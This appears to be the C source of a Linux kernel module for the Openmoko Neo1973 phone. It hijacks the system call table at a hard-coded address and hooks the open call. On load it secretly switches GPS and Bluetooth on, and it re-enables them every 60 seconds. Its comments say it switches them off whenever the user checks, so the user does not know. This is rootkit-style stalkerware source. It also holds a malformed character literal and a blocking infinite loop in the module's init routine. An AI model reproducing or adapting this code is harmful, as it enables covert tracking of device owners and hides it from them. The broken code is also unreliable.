#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for KERN_INFO */
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/linkage.h>
#include <linux/types.h>
#include <linux/compiler.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <asm/uaccess.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");

struct syscall_handler_t **sys_call_table;
asmlinkage ssize_t (*old_sys_write)(unsigned int fd, const char __user *buf, size_t count);
asmlinkage ssize_t (*old_sys_read)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long (*old_sys_open)(const char __user *filename, int flags, int mode);
asmlinkage long (*old_sys_close)(unsigned int fd);

/* Our new open system call.  It will always return the original open function.     *
 * We monitor the filename sent through the open system call.  If something tries   * 
 * to use the gps or bluetooth, we turn the devices off.  This is so that if a user *
 * is checking if their gps is on we shut it off so they do not know we had it on   */
asmlinkage long new_sys_open(const char __user *filename, int flags, int mode)
{
	int fd;
	char gpsoff='0', btoff='0', reset='1';
	if(strstr(filename,"neo1973-pm-bt") != NULL || strstr(filename,"neo1973-pm-gps") != NULL){
	      printk(KERN_INFO "BT\n");

	      mm_segment_t old_fs = get_fs();
	      set_fs(KERNEL_DS);

	      fd = old_sys_open("/sys/bus/platform/drivers/neo1973-pm-gps/neo1973-pm-gps.0/pwron", O_WRONLY,0);
	      printk(KERN_INFO "FD: %d",fd);

	      old_sys_write(fd,&gpsoff,1);
	      old_sys_close(fd);

	      fd = old_sys_open("/sys/devices/platform/s3c2440-i2c/i2c-adapter/i2c-0/0-0073/neo1973-pm-bt.0", O_WRONLY,0);
	      old_sys_write(fd,&btoff,1);
	      old_sys_close(fd);

	      fd = old_sys_open("/sys/bus/platform/devices/neo1973-pm-bt.0/reset", O_WRONLY, 0);
	      old_sys_write(fd, &reset,1);
	      old_sys_close(fd);

	      set_fs(old_fs);
	}
  
	return old_sys_open(filename,flags,mode);
}

int init_module(void)
{
	int fd;
	char gpson = '1', bton ='1', reset = '0';
	/* define the sys_call_table.  Memory address is given from System.map */
	sys_call_table = (struct syscall_handler_t *)0xc00290e8;  

	old_sys_open = sys_call_table[__NR_open];    // keep original pointer to sys_open
	old_sys_write = sys_call_table[__NR_write];  // keep original pointer to sys_write
	old_sys_read = sys_call_table[__NR_read];    // keep original pointer to sys_read
	old_sys_close = sys_call_table[__NR_close];  // keep original pointer to sys_close

	sys_call_table[__NR_open] = new_sys_open;    // input our new sys_open
	
	mm_segment_t old_fs = get_fs();
	set_fs(KERNEL_DS);

	/* turn on gps by writing 1 to the file */
	fd = old_sys_open("/sys/bus/platform/drivers/neo1973-pm-gps/neo1973-pm-gps.0/pwron", O_WRONLY,0);
	old_sys_write(fd,&gpson,1);
	old_sys_close(fd);

	/* turn on bluetooth by writing 1 to these two files */
	fd = old_sys_open("/sys/devices/platform/s3c2440-i2c/i2c-adapter/i2c-0/0-0073/neo1973-pm-bt.0", O_WRONLY,0);
	old_sys_write(fd,&bton,1);
	old_sys_close(fd);

	fd = old_sys_open("/sys/bus/platform/devices/neo1973-pm-bt.0/reset", O_WRONLY, 0);
	old_sys_write(fd, &reset,1);
	old_sys_close(fd);
	
	/* Infinite for loop which checks if the gps is off.  If it is off we assume both the  *
         * bluetooth and gps are off and we turn them back on.  We do this every 60 seconds.   */
	for(;;)
	{
	      char *buf;
	      int checkfd;
	      printk("IN INFINITE FOR\n");
    
	      buf = kmalloc(1, GFP_KERNEL);

	      fd = old_sys_open("/sys/bus/platform/drivers/neo1973-pm-gps/neo1973-pm-gps.0/pwron", O_RDONLY,0);
	      old_sys_read(fd,buf,1); // read one character from the file
	      old_sys_close(fd);
  
	      /* check to see if file was 0 (off) */
	      if(buf[0] == '0)'{

		    fd = old_sys_open("/sys/bus/platform/drivers/neo1973-pm-gps/neo1973-pm-gps.0/pwron", O_WRONLY,0);
		    printk(KERN_INFO "FD: %d",fd);

		    old_sys_write(fd,&gpson,1);
		    old_sys_close(fd);

		    fd = old_sys_open("/sys/devices/platform/s3c2440-i2c/i2c-adapter/i2c-0/0-0073/neo1973-pm-bt.0", O_WRONLY,0);
		    old_sys_write(fd,&bton,1);
		    old_sys_close(fd);

		    fd = old_sys_open("/sys/bus/platform/devices/neo1973-pm-bt.0/reset", O_WRONLY, 0);
		    old_sys_write(fd, &reset,1);
		    old_sys_close(fd);
	      }
	      
	      kfree(buf);
	      ssleep(60);
	}

	set_fs(old_fs);
	/* 
	 * A non 0 return means init_module failed; module can't be loaded. 
	 */
	return 0;
}

void cleanup_module(void)
{
	/* change open system call back to original function */
	sys_call_table[__NR_open] = old_sys_open;
}	